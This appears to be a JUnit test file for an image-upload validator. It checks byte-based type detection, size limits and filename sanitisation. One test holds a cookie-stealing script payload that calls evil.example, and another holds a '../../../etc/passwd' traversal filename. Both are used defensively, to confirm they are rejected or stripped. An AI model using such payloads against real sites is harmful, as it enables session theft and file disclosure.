package com.memorygraph.backend.memory.application.upload;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.io.IOException;
import java.nio.charset.StandardCharsets;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.util.unit.DataSize;
import org.springframework.web.multipart.MultipartFile;

import com.memorygraph.backend.common.error.ApiException;
import com.memorygraph.backend.common.error.ErrorCode;
import com.memorygraph.backend.memory.domain.MemoryType;
import com.memorygraph.backend.storage.StorageProperties;
import com.memorygraph.backend.support.TestFixtures;

class UploadValidatorTest {

    private UploadValidator validator;

    @BeforeEach
    void setUp() {
        validator = newValidator(DataSize.ofMegabytes(1));
    }

    @Test
    void acceptsARealPngAndClassifiesItAsAPhoto() throws IOException {
        ValidatedUpload upload = validator.validate(file("holiday.png", "image/png", TestFixtures.pngImage(8, 8)));

        assertThat(upload.mediaType()).isEqualTo(SupportedMediaType.PNG);
        assertThat(upload.mediaType().memoryType()).isEqualTo(MemoryType.PHOTO);
        assertThat(upload.fileName()).isEqualTo("holiday.png");
    }

    @Test
    void acceptsARealJpeg() throws IOException {
        ValidatedUpload upload = validator.validate(file("photo.jpg", "image/jpeg", TestFixtures.jpegImage(8, 8)));

        assertThat(upload.mediaType()).isEqualTo(SupportedMediaType.JPEG);
    }

    /**
     * The central guarantee of upload validation: the declared type is ignored in favour of the bytes,
     * so a script cannot be stored as an image and served back to a browser.
     */
    @Test
    void rejectsAScriptDisguisedAsAnImage() {
        MultipartFile hostile = file("innocent.png", "image/png",
                "<script>fetch('https://evil.example/'+document.cookie)</script>".getBytes(StandardCharsets.UTF_8));

        assertThatThrownBy(() -> validator.validate(hostile))
                .isInstanceOf(ApiException.class)
                .extracting(exception -> ((ApiException) exception).getErrorCode())
                .isEqualTo(ErrorCode.UNSUPPORTED_MEDIA_TYPE);
    }

    @Test
    void acceptsAnImageWhoseDeclaredTypeIsWrong() throws IOException {
        ValidatedUpload upload = validator.validate(
                file("mislabelled.png", "application/octet-stream", TestFixtures.pngImage(4, 4)));

        assertThat(upload.mediaType()).isEqualTo(SupportedMediaType.PNG);
    }

    @Test
    void rejectsAnEmptyUpload() {
        assertThatThrownBy(() -> validator.validate(file("empty.png", "image/png", new byte[0])))
                .isInstanceOf(ApiException.class)
                .extracting(exception -> ((ApiException) exception).getErrorCode())
                .isEqualTo(ErrorCode.VALIDATION_FAILED);
    }

    @Test
    void rejectsAMissingUpload() {
        assertThatThrownBy(() -> validator.validate(null)).isInstanceOf(ApiException.class);
    }

    @Test
    void rejectsAFileLargerThanTheConfiguredLimit() throws IOException {
        UploadValidator strictValidator = newValidator(DataSize.ofBytes(16));

        assertThatThrownBy(() -> strictValidator.validate(file("big.png", "image/png", TestFixtures.pngImage(64, 64))))
                .isInstanceOf(ApiException.class)
                .extracting(exception -> ((ApiException) exception).getErrorCode())
                .isEqualTo(ErrorCode.PAYLOAD_TOO_LARGE);
    }

    @Test
    void stripsAnyDirectoryComponentFromTheDisplayName() throws IOException {
        ValidatedUpload upload = validator.validate(
                file("../../../etc/passwd.png", "image/png", TestFixtures.pngImage(4, 4)));

        assertThat(upload.fileName()).isEqualTo("passwd.png");
    }

    @Test
    void fallsBackToAPlaceholderWhenNoUsableNameIsGiven() throws IOException {
        ValidatedUpload upload = validator.validate(file(null, "image/png", TestFixtures.pngImage(4, 4)));

        assertThat(upload.fileName()).isEqualTo("upload");
    }

    private UploadValidator newValidator(DataSize maxFileSize) {
        return new UploadValidator(new StorageProperties(StorageProperties.Backend.LOCAL, maxFileSize,
                new StorageProperties.Local("./target/unused")));
    }

    private MultipartFile file(String name, String contentType, byte[] content) {
        return new MockMultipartFile("file", name, contentType, content);
    }
}
